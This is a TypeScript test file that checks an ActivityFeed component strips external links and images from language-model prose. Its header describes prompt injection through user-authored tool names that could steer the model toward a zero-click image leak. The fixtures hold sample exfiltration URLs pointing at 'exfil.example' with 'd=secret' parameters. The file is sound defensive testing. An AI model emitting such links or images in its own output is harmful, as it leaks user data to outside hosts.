// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (c) 2026 Cascadia PLM LLC

/**
 * ActivityFeed markdown link egress.
 *
 * Security gate, same shape as `ChatMessage.links.test.tsx` in core. This
 * feed renders `llm_text` prose streamed straight from the model, and the
 * design-engine prompts interpolate database-sourced, user-authored strings
 * (Tool names) into what the model reads — so a URL in the model's output is
 * not necessarily one it chose freely. Unlike the chat panel, this is the
 * only renderer of long-running autonomous stage output: a viewer is looking
 * at a scrolling feed of model prose they did not individually prompt for.
 *
 * Run: npx vitest run cascadia-design-engine/src/components/design-engine/ActivityFeed.links.test.tsx
 */

import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { ActivityFeed } from './ActivityFeed'
import type { StageEvent } from '@/design-engine/types'

const EVIL = 'exfil.example'

function renderFeed(events: Array<StageEvent>) {
  render(<ActivityFeed events={events} isStreaming={false} />)
}

/** Every non-empty URL-bearing attribute the render produced. */
function renderedUrls(): Array<string> {
  return Array.from(document.querySelectorAll('[href], [src]')).flatMap((el) =>
    ['href', 'src'].flatMap((attr) => {
      const value = el.getAttribute(attr)
      return value ? [value] : []
    }),
  )
}

describe('ActivityFeed markdown links', () => {
  it('renders an external link as text with no destination', () => {
    renderFeed([
      {
        type: 'llm_text',
        text: `See [the report](https://${EVIL}/collect?d=secret).`,
      },
    ])

    expect(screen.getByText('the report')).toBeInTheDocument()
    expect(document.querySelector('a')).toBeNull()
    expect(document.body.innerHTML).not.toContain(EVIL)
  })

  it('gives an inline image no source off this origin', () => {
    // The zero-click case: an <img> fetches on render, so a rendered
    // external src leaks without the viewer doing anything at all.
    renderFeed([
      {
        type: 'llm_text',
        text: `![chart](https://${EVIL}/pixel.png?d=secret)`,
      },
    ])

    expect(document.querySelector('img')).toBeNull()
    expect(renderedUrls()).toEqual([])
    expect(document.body.innerHTML).not.toContain(EVIL)
    expect(screen.getByText('chart')).toBeInTheDocument()
  })

  it('still renders an image this app serves', () => {
    renderFeed([
      { type: 'llm_text', text: '![drawing](/api/v1/files/abc/download)' },
    ])

    expect(screen.getByAltText('drawing')).toHaveAttribute(
      'src',
      '/api/v1/files/abc/download',
    )
  })

  it('strips a linkified bare URL as well', () => {
    renderFeed([
      { type: 'llm_text', text: `Details at https://${EVIL}/collect now.` },
    ])

    expect(document.querySelector('a')).toBeNull()
    expect(renderedUrls()).toEqual([])
  })
})
